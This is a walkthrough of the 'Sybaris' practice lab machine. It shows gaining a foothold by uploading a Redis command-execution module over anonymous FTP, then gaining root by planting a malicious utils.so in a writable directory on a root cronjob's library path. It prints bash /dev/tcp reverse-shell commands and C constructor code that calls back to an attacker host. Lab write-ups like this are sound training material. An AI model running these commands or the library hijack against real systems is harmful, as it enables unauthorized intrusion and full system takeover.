##### Tags: `ftp`  `gcc`  `dev`  `cronjob`

# 🐧Sybaris🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.175.93
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-09 22:23 AEDT
Nmap scan report for 192.168.175.93
Host is up (0.12s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE  SERVICE   VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp       vsftpd 3.0.2
22/tcp    open   ssh       OpenSSH 7.4 (protocol 2.0)
53/tcp    closed domain
80/tcp    open   http      Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
6379/tcp  open   redis     Redis key-value store 5.0.9
Service Info: OS: Unix
```
port 21 ftp we can login as anonymous and have write access to pub
```console
$ ftp 192.168.175.93
Connected to 192.168.175.93.
220 (vsFTPd 3.0.2)
Name (192.168.175.93:ming): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||10092|).
150 Here comes the directory listing.
drwxr-xr-x    3 0        0              17 Sep 04  2020 .
drwxr-xr-x    3 0        0              17 Sep 04  2020 ..
drwxrwxrwx    2 0        0              23 Mar 09 11:53 pub
```
since we can upload via ftp, we can upload a .so file to execute commands through redis  
https://github.com/n0b0dyCN/RedisModules-ExecuteCommand  
upload the module.so file to ftp
```console
ftp> put module.so
local: module.so remote: module.so
229 Entering Extended Passive Mode (|||10094|).
150 Ok to send data.
100% |*********************************************************************| 48208      411.51 KiB/s    00:00 ETA
226 Transfer complete.
```
the default location of ftp is var/ftp  
we use redis-cli to execute reverse shell
```console
$ redis-cli -h 192.168.175.93  
192.168.175.93:6379> MODULE LOAD /var/ftp/pub/module.so
OK

192.168.175.93:6379> system.exec "id"
"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"

192.168.175.93:6379> system.exec "bash -c 'bash -i >& /dev/tcp/192.168.45.210/21 0>&1'"
```
```console
$ penelope -p 21
[+] Listening for reverse shells on 0.0.0.0:21 →  127.0.0.1 • 10.0.2.15 • 192.168.45.210
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from sybaris 192.168.175.93 Linux-x86_64 👤 pablo(1000) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/sybaris~192.168.175.93-Linux-x86_64/2026_03_09-22_56_41-974.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[pablo@sybaris /]$ id
uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)
```
## Privilege Escalation
linpeas shows we have write permission to /usr/local/lib/dev
```
[pablo@sybaris lib]$ ls -la
total 0
drwxr-xr-x.  4 root root  30 Sep  7  2020 .
drwxr-xr-x. 12 root root 131 Sep  4  2020 ..
drwxrwxrwx   2 root root  22 Mar  9 08:17 dev
```
there is a cronjob running log-sweeper
```console
[pablo@sybaris lib]$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils
MAILTO=""

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
  *  *  *  *  * root       /usr/bin/log-sweeper
```
its running a file of utils.so
```console
[pablo@sybaris lib]$ strings /usr/bin/log-sweeper
/lib64/ld-linux-x86-64.so.2
so*l
utils.so
```
the utils.so is in /usr/local/lib/utils  
according for the path cronjob will look for path /usr/local/lib/dev first 
```console
LD_LIBRARY_PATH=/usr/lib:/usr/lib64:/usr/local/lib/dev:/usr/local/lib/utils

[pablo@sybaris lib]$ find / -name utils.so 2>/dev/null
/usr/local/lib/utils/utils.so
```
since we have write permission, we can put a malicious file name utils.so in the /usr/local/lib/dev  
the cronjob will execute it before the real one
```console
$ cat 1.c            
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void setup_root_shell() {
    if (geteuid() == 0) {
        system("bash -c 'bash -i >& /dev/tcp/192.168.45.210/22 0>&1'");
    }
}
```
upload and compile from .c to .so file
```console
[pablo@sybaris tmp]$ wget http://192.168.45.210/1.c -O 1.c
HTTP request sent, awaiting response... 200 OK
Length: 221 [text/x-csrc]
Saving to: ‘1.c’

100%[========================================================================>] 221         --.-K/s   in 0.003s  

2026-03-09 08:10:28 (79.5 KB/s) - ‘1.c’ saved [221/221]

[pablo@sybaris tmp]$ gcc -shared -fPIC -o /usr/local/lib/dev/utils.so 1.c
```
after one minute and we got the shell
```console
$ penelope -p 22     
[+] Listening for reverse shells on 0.0.0.0:22 →  127.0.0.1 • 10.0.2.15 • 192.168.45.210
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from sybaris 192.168.175.93 Linux-x86_64 👤 root(0) • Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /bin/python
[+] Interacting with session [1] • Shell Type PTY • Menu key F12 ⇐
[+] Logging to /home/ming/.penelope/sessions/sybaris~192.168.175.93-Linux-x86_64/2026_03_09-23_18_03-673.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[root@sybaris ~]# id
uid=0(root) gid=0(root) groups=0(root)
```
